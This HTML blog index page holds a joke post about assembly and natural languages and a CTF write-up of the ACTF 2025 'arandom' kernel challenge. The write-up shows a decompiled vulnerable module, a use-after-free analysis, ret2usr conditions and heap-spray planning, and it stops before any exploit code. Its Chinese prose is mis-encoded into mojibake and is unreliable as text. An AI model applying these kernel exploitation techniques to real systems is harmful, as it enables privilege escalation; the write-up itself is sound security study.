<!DOCTYPE html>
<html lang="zh">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="FÃ¢tih&#39;in Ä°stanbul&#39;u fethettiÄŸi yaÅŸtasÄ±n!">
<meta property="og:type" content="website">
<meta property="og:title" content="Blog de ĞĞ°Ğ·Ñ€Ğ¸Ğ½Ğ´Ğ°Ğº">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="Blog de ĞĞ°Ğ·Ñ€Ğ¸Ğ½Ğ´Ğ°Ğº">
<meta property="og:description" content="FÃ¢tih&#39;in Ä°stanbul&#39;u fethettiÄŸi yaÅŸtasÄ±n!">
<meta property="og:locale">
<meta property="article:author" content="NazrinDuck">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh'
  };
</script>

  <title>Blog de ĞĞ°Ğ·Ñ€Ğ¸Ğ½Ğ´Ğ°Ğº</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Blog de ĞĞ°Ğ·Ñ€Ğ¸Ğ½Ğ´Ğ°Ğº</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">ä¸Šä¸å»ä¸‹ä¸æ¥ï¼Œå¡åœ¨è¿™äº†</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/05/21/languages/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="NazrinDuck">
      <meta itemprop="description" content="FÃ¢tih'in Ä°stanbul'u fethettiÄŸi yaÅŸtasÄ±n!">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Blog de ĞĞ°Ğ·Ñ€Ğ¸Ğ½Ğ´Ğ°Ğº">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/05/21/languages/" class="post-title-link" itemprop="url">è‡ªç„¶è¯­è¨€&èµ›åšè¯­è¨€ã®å¥‡æ€å¦™æƒ³</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2025-05-21 00:17:19 / Modified: 00:32:58" itemprop="dateCreated datePublished" datetime="2025-05-21T00:17:19+08:00">2025-05-21</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <blockquote>
<p>ç”¨æ¥è®°è½½ä¸€äº›æ—¥å¸¸çªç„¶è¿¸å‘çš„å¥‡æ€å¦™æƒ³(?)&#x2F;å†·ç¬‘è¯ä¹‹ç±»çš„ä¸œè¥¿</p>
</blockquote>
<ol>
<li>x86_64æ±‡ç¼–å°±åƒå¡å°”ç»´äºšè¯­ï¼Œæœ‰ä¸¤å¥—æ­£å­—æ³•ã€‚å¡å°”ç»´äºšè¯­æœ‰è¥¿é‡Œå°”å­—æ¯å’Œæ‹‰ä¸å­—æ¯ä¸¤ç§æ ¼å¼ï¼Œè€Œx86_64æ±‡ç¼–æœ‰Intelå’ŒATï¼†Tä¸¤ç§æ­£å­—æ³•ã€‚ï¼ˆè¿™ä¸¤ç§æˆ‘éƒ½æ›´åå‘äºä½¿ç”¨å‰è€…ï¼‰</li>
</ol>
<blockquote>
<p>GNUå…‹ç½—åœ°äºšï¼ŒIntelå¡å°”ç»´äºšè¯´æˆç«‹(bushi)ï¼Œèµ›åšå·´å°”å¹²è¿™ä¸€å—</p>
</blockquote>
<ol start="2">
<li><p>è‡ªç„¶è¯­è¨€å¤§å¤šæ•°å­—æ¯ç³»ç»Ÿéƒ½æ˜¯å¤§ç«¯åºçš„ï¼Œä½†é˜¿æ‹‰ä¼¯å­—æ¯æ˜¯å°ç«¯åºã€‚ä¸è¿‡ï¼Œé˜¿æ‹‰ä¼¯å­—æ¯ä¸­çš„ç«‹å³æ•°ï¼ˆæ•°å­—ï¼‰è¿˜æ˜¯å¤§ç«¯åºçš„ã€‚</p>
</li>
<li><p>å¤§å®¶å¥½å•Šï¼Œæˆ‘æ˜¯é»ç€è¯­</p>
</li>
</ol>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[inline]</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">try_open</span>(&amp;<span class="keyword">mut</span> <span class="keyword">self</span>) <span class="punctuation">-&gt;</span> io::<span class="type">Result</span>&lt;()&gt; &#123;</span><br><span class="line">  ...</span><br><span class="line">    <span class="keyword">self</span>.pathbuf = fs::<span class="title function_ invoke__">canonicalize</span>(&amp;<span class="keyword">self</span>.name)?;</span><br><span class="line">    <span class="keyword">self</span>.name = <span class="keyword">self</span></span><br><span class="line">        .pathbuf</span><br><span class="line">        .<span class="title function_ invoke__">file_name</span>()</span><br><span class="line">        .<span class="title function_ invoke__">unwrap</span>()</span><br><span class="line">        .<span class="title function_ invoke__">to_str</span>()</span><br><span class="line">        .<span class="title function_ invoke__">unwrap</span>()</span><br><span class="line">        .<span class="title function_ invoke__">to_string</span>();</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">Ok</span>(())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><del>å‡ºè‡ªæœ¬äººæŸå †rustğŸ’©å±±</del></p>
</blockquote>
<p>æœ‰çµæ„Ÿè¿˜ä¼šå†æ›´æ–°</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/05/14/ACTF-arandom/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="NazrinDuck">
      <meta itemprop="description" content="FÃ¢tih'in Ä°stanbul'u fethettiÄŸi yaÅŸtasÄ±n!">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Blog de ĞĞ°Ğ·Ñ€Ğ¸Ğ½Ğ´Ğ°Ğº">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/05/14/ACTF-arandom/" class="post-title-link" itemprop="url">[ACTF 2025] arandomå¤ç°</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2025-05-14 17:20:57" itemprop="dateCreated datePublished" datetime="2025-05-14T17:20:57+08:00">2025-05-14</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-05-21 00:04:32" itemprop="dateModified" datetime="2025-05-21T00:04:32+08:00">2025-05-21</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <blockquote>
<p>æœ€è¿‘å¤ç°çš„ä¸€ä¸ªå¾ˆ<strong>éšæœº</strong>çš„å†…æ ¸é¢˜ï¼Œæ„Ÿè§‰å­¦åˆ°äº†å¾ˆå¤šä¸œè¥¿ï¼Œç‰¹æ­¤è®°å½•ä¸€ä¸‹</p>
</blockquote>
<h2 id="é˜²æŠ¤æ£€æŸ¥"><a href="#é˜²æŠ¤æ£€æŸ¥" class="headerlink" title="é˜²æŠ¤æ£€æŸ¥"></a>é˜²æŠ¤æ£€æŸ¥</h2><p>é¢˜ç›®ç»™äº†Kconfigï¼Œä»ä¸­æˆ‘ä»¬å¯ä»¥å¾—åˆ°è¯¥å†…æ ¸ç‰ˆæœ¬ä¸º<strong>Linux 6.14.2</strong>ï¼Œç®—å¾ˆæ–°çš„å†…æ ¸äº†ï¼Œä¹‹å‰çš„å¾ˆå¤šæ‰‹æ³•å¤§æ¦‚ç‡éƒ½ä¼šå¤±æ•ˆ</p>
<p>å¯åŠ¨è„šæœ¬å¼€å¯äº†kaslrï¼Œbanæ‰äº†io_uringï¼Œä½†æ˜¯æ²¡æœ‰å¼€å¯smep&#x2F;smapï¼Œæ„å‘³ç€å¯ä»¥æ‰“ret2usrï¼Œä»…éœ€æ³„æ¼å†…æ ¸åœ°å€+æ§åˆ¶å†…æ ¸æ‰§è¡Œæµå³å¯ææƒ</p>
<blockquote>
<p>åŸèµ›é¢˜å‡ºé¢˜äºº&#x2F;etcç›®å½•æƒé™æé”™äº†ï¼Œå¯¼è‡´å¯ä»¥è‡ªå·±é€ ä¸€ä¸ªä¼ª&#x2F;etc&#x2F;passwdç„¶åå¤§å¤§æ–¹æ–¹ç™»é™†rootéé¢„æœŸ</p>
<blockquote>
<p>å†…æ ¸é¢˜æé”™æƒé™è§è¿‡å¾ˆå¤šæ¬¡äº†ï¼Œä½†æ˜¯æˆ‘æ²¡æœ‰ä¸€æ¬¡åœ¨èµ›æ—¶å‘ç°è¿‡ :(</p>
</blockquote>
</blockquote>
<h2 id="é€†å‘åˆ†æ"><a href="#é€†å‘åˆ†æ" class="headerlink" title="é€†å‘åˆ†æ"></a>é€†å‘åˆ†æ</h2><p>é¢˜ç›®åŒ…å«äº†ä¸€ä¸ªæ¼æ´æ¨¡å—arandom.koã€‚é€†å‘åˆ†æé€»è¾‘å¾ˆç®€å•ï¼Œæœ€ä¸»è¦çš„å‡½æ•°æ˜¯<code>arandom_ioctl</code>:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">arandom_ioctl</span><span class="params">(file *file, <span class="type">unsigned</span> <span class="type">int</span> a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="comment">// r12</span></span><br><span class="line">  __int64 rand_offset; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  mutex_lock(&amp;arandom_mutex);</span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="number">4099</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = <span class="number">-1LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( allocated )</span><br><span class="line">    &#123;</span><br><span class="line">      rand_offset = AAA.rand_offset;</span><br><span class="line">      v5 = <span class="number">-22LL</span>;</span><br><span class="line">      <span class="keyword">if</span> ( rand_offset + <span class="number">4</span> &lt;= (<span class="type">unsigned</span> __int64)AAA.rand_size )</span><br><span class="line">      &#123;</span><br><span class="line">        v5 = <span class="number">0LL</span>;</span><br><span class="line">        *(_DWORD *)((<span class="type">char</span> *)buffer + rand_offset) = AAA.rand_value;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a2 &gt; <span class="number">0x1003</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( a2 == <span class="number">4100</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v5 = <span class="number">-14LL</span>;</span><br><span class="line">        <span class="keyword">if</span> ( copy_to_user(a3, &amp;AAA, <span class="number">12LL</span>) )</span><br><span class="line">          <span class="keyword">goto</span> out;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_6;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( a2 == <span class="number">0x1005</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = AAA.rand_offset;</span><br><span class="line">        <span class="keyword">if</span> ( *(_QWORD *)((<span class="type">char</span> *)buffer + v4) == AAA.rand_value</span><br><span class="line">          &amp;&amp; v4 == *(_QWORD *)((<span class="type">char</span> *)buffer + v4 + <span class="number">16</span>)</span><br><span class="line">          &amp;&amp; *(_QWORD *)((<span class="type">char</span> *)buffer + v4 + <span class="number">24</span>) == AAA.rand_size )</span><br><span class="line">        &#123;</span><br><span class="line">          *(_QWORD *)((<span class="type">char</span> *)buffer + v4 + <span class="number">32</span>) = &amp;get_random_bytes;</span><br><span class="line">        &#125;</span><br><span class="line">LABEL_6:</span><br><span class="line">        v5 = <span class="number">0LL</span>;</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">      &#125;</span><br><span class="line">LABEL_24:</span><br><span class="line">      v5 = <span class="number">-25LL</span>;</span><br><span class="line">      <span class="keyword">goto</span> out;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( a2 == <span class="number">4097</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = <span class="number">-1LL</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !allocated )</span><br><span class="line">      &#123;</span><br><span class="line">        buffer = (<span class="type">void</span> *)_kmalloc_noprof(AAA.rand_size, <span class="number">3264LL</span>);</span><br><span class="line">        <span class="keyword">if</span> ( buffer )</span><br><span class="line">        &#123;</span><br><span class="line">          allocated = <span class="number">1</span>;</span><br><span class="line">          v5 = <span class="number">0LL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v5 = <span class="number">-12LL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( a2 != <span class="number">4098</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_24;</span><br><span class="line">      v5 = <span class="number">-1LL</span>;</span><br><span class="line">      <span class="keyword">if</span> ( allocated &amp;&amp; !freed )</span><br><span class="line">      &#123;</span><br><span class="line">        v5 = <span class="number">0LL</span>;</span><br><span class="line">        kfree(buffer);</span><br><span class="line">        freed = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">out:</span><br><span class="line">  mutex_unlock(&amp;arandom_mutex);</span><br><span class="line">  <span class="keyword">return</span> v5;</span><br></pre></td></tr></table></figure>

<p>æœ‰ä¸€ä¸ªå¾ˆæ˜æ˜¾çš„UAF,ä½†æ˜¯åªèƒ½ä½¿ç”¨ä¸€æ¬¡ï¼›è¿˜æœ‰ä¸€ä¸ªåœ°å€æ³„æ¼ï¼Œä¸è¿‡éœ€è¦æ„é€ æ¡ä»¶ã€‚å…¶ä¸­å…¨å±€å˜é‡<code>AAA</code>çš„ç±»å‹å¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">arandom_params</span> // <span class="title">sizeof</span>=</span><span class="number">0xC</span></span><br><span class="line">&#123;</span><br><span class="line">    u32 rand_size;</span><br><span class="line">    u32 rand_offset;</span><br><span class="line">    u32 rand_value;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>å…¶åœ¨åˆå§‹åŒ–çš„æ—¶å€™è¢«èµ‹äºˆäº†éšæœºå˜é‡ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">arandom_init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  u32 v0; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  get_random_bytes(&amp;AAA, <span class="number">4LL</span>);</span><br><span class="line">  v0 = AAA.rand_size &amp; <span class="number">0x7FFF</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (AAA.rand_size &amp; <span class="number">0x7FFF</span>) == <span class="number">0</span> )</span><br><span class="line">    v0 = <span class="number">0x8000</span>;</span><br><span class="line">  AAA.rand_size = v0;</span><br><span class="line">  get_random_bytes(&amp;AAA.rand_offset, <span class="number">4LL</span>);</span><br><span class="line">  AAA.rand_offset %= (<span class="type">unsigned</span> __int64)AAA.rand_size - <span class="number">4</span>;</span><br><span class="line">  get_random_bytes(&amp;AAA.rand_value, <span class="number">4LL</span>);</span><br><span class="line">  misc_register(&amp;arandom_miscdev);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹å‡ºè¿™æ˜¯ä¸€ä¸ªéå¸¸éšæœºçš„é¢˜ï¼Œç”³è¯·éšæœºå¤§å°çš„heap,å¹¶åœ¨éšæœºä½ç½®å†™å…¥éšæœºå­—èŠ‚ï¼ˆä½†æ˜¯é•¿åº¦å›ºå®šä¸ºDWORDï¼‰<br>ä»”ç»†åˆ†æå‘ç°ï¼Œ<code>rand_size</code>çš„èŒƒå›´åœ¨0x0000~0x7FFFä¹‹é—´ï¼Œè€Œä¸”æœ‰ä¸€åŠçš„æ¦‚ç‡è½åœ¨0x7xxxçš„èŒƒå›´å†…ï¼›<br>è¿™ä¸ªå¤§å°åœ¨<code>kmalloc</code>ä¸­ä¼šè¿›å…¥<code>__kmalloc_large_noprof</code>å‡½æ•°ï¼ˆ<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.14.2/source/include/linux/slab.h#L897">å…¶å®å¤§äºä¸¤ä¸ªé¡µçš„sizeï¼ˆ0x2000ï¼‰å°±ä¼šè§¦å‘äº†</a>ï¼‰ï¼Œå¹¶ä¼šè¿›ä¸€æ­¥è¿›å…¥å‡½æ•°<code>___kmalloc_large_node</code>ï¼Œæœ€ç»ˆè°ƒç”¨å‡½æ•°<code>alloc_pages_node_noprof</code>ï¼Œç›´æ¥ä»buddy systemä¸­ç”³è¯·å¯¹åº”orderçš„é¡µ</p>
<blockquote>
<p>0x7xxxå¤§å°å¯¹åº”çš„ä¸ºorder-3çš„é¡µåˆ†é…ï¼Œè¿™ä¼šä¸€æ¬¡æ€§è¿”å›(2^3&#x3D;)8ä¸ªé¡µ</p>
</blockquote>
<p>ä¸‹é¢æˆ‘ä»¬å°±å‡è®¾ç”³è¯·çš„sizeä¸º0x7xxxï¼Œå³åœ¨è§¦å‘order-3é¡µåˆ†é…çš„æƒ…å†µä¸‹è¿›è¡Œè¿›ä¸€æ­¥çš„åˆ©ç”¨ï¼ˆæ­¤æ—¶æˆåŠŸç‡å¤§çº¦åœ¨75%å·¦å³ï¼‰</p>
<blockquote>
<p>äº‹å®ä¸Šï¼Œsizeåœ¨0x4000~0x7xxxå¤§å°ä¹‹é—´çš„sizeéƒ½æ»¡è¶³è¦æ±‚ï¼Œæ‰€ä»¥æˆåŠŸç‡è¿˜è¦é«˜ä¸€äº›</p>
</blockquote>
<p>è¦åˆ©ç”¨UAF,æˆ‘ä»¬é¦–å…ˆè¦å°†å…¶<code>kfree</code>æ‰ã€‚é€šè¿‡<code>__kmalloc_large_noprof</code>å‡½æ•°å¾—åˆ°çš„heap,åœ¨kfreeçš„æ—¶å€™ä¼šç›´æ¥è§¦å‘page freeï¼Œä»è€Œå†æ¬¡å›åˆ°buddy systemçš„order-3é‡Œè¾¹å»<br>å› æ­¤ï¼Œæˆ‘ä»¬å°±ä»order-3 page(size 0x8000)å¼€å§‹å¯»æ‰¾åˆ©ç”¨æ‰‹æ®µ</p>
<h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><h3 id="å¯»æ‰¾å †å–·å¯¹è±¡"><a href="#å¯»æ‰¾å †å–·å¯¹è±¡" class="headerlink" title="å¯»æ‰¾å †å–·å¯¹è±¡"></a>å¯»æ‰¾å †å–·å¯¹è±¡</h3><p>è¦å–å‡ºorder-3çš„pageå…¶å®æœ‰æŒºå¤šåŠæ³•çš„ï¼Œé™¤äº†å—¯å–·<code>pipe_buffer</code>ä»order-0ä¸€è·¯å–åˆ°order-3ä¹‹å¤–ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡ç”³è¯·æ–°çš„å¯¹åº”å¤§å°çš„slabæ¥æ­£å¥½å–èµ°è¿™ä¸ªorder-3</p>
<blockquote>
<p>åœ¨ç¬¬ä¸€æ­¥é€‰ç”¨<code>pipe_buffer</code>éœ€è¦å †å–·å¤§é‡çš„pipeï¼Œå¾ˆå®¹æ˜“è¶…å‡ºæœ€å¤§æ–‡ä»¶æ‰“å¼€é™åˆ¶ï¼ˆå³ä½¿åœ¨ä¿®æ”¹rlimitçš„æƒ…å†µä¸‹ï¼‰</p>
</blockquote>
<p>é€šè¿‡æŸ¥çœ‹<code>/proc/slabinfo</code>ä¸­çš„å†…å®¹ï¼Œæˆ‘ä»¬å¯ä»¥äº†è§£åˆ°ä¸åŒçš„slabçš„ä¿¡æ¯</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">bash-5.2# <span class="built_in">cat</span> /proc/slabinfo | <span class="built_in">tail</span> -n 15</span><br><span class="line">kmalloc-8k             8      8   8192    4    8 : tunables    0    0    0 : slabdata      2      2      0</span><br><span class="line">kmalloc-4k            80     80   4096    8    8 : tunables    0    0    0 : slabdata     10     10      0</span><br><span class="line">kmalloc-2k           176    176   2048    8    4 : tunables    0    0    0 : slabdata     22     22      0</span><br><span class="line">kmalloc-1k           344    344   1024    8    2 : tunables    0    0    0 : slabdata     43     43      0</span><br><span class="line">kmalloc-512          392    392    512    8    1 : tunables    0    0    0 : slabdata     49     49      0</span><br><span class="line">kmalloc-256          496    496    256   16    1 : tunables    0    0    0 : slabdata     31     31      0</span><br><span class="line">kmalloc-128          320    320    128   32    1 : tunables    0    0    0 : slabdata     10     10      0</span><br><span class="line">kmalloc-64          1152   1152     64   64    1 : tunables    0    0    0 : slabdata     18     18      0</span><br><span class="line">kmalloc-32          1197   1280     32  128    1 : tunables    0    0    0 : slabdata     10     10      0</span><br><span class="line">kmalloc-16          1280   1280     16  256    1 : tunables    0    0    0 : slabdata      5      5      0</span><br><span class="line">kmalloc-8           1536   1536      8  512    1 : tunables    0    0    0 : slabdata      3      3      0</span><br><span class="line">kmalloc-192         1050   1050    192   21    1 : tunables    0    0    0 : slabdata     50     50      0</span><br><span class="line">kmalloc-96          3780   3780     96   42    1 : tunables    0    0    0 : slabdata     90     90      0</span><br><span class="line">kmem_cache_node      192    192     64   64    1 : tunables    0    0    0 : slabdata      3      3      0</span><br><span class="line">kmem_cache           160    160    256   16    1 : tunables    0    0    0 : slabdata     10     10      0</span><br></pre></td></tr></table></figure>

<blockquote>
<p>è¯¥ä¿¡æ¯çš„éƒ¨åˆ†æ ¼å¼å¦‚ä¸‹ï¼š</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># name            &lt;active_objs&gt; &lt;num_objs&gt; &lt;objsize&gt; &lt;objperslab&gt; &lt;pagesperslab&gt; ...</span><br></pre></td></tr></table></figure>
</blockquote>
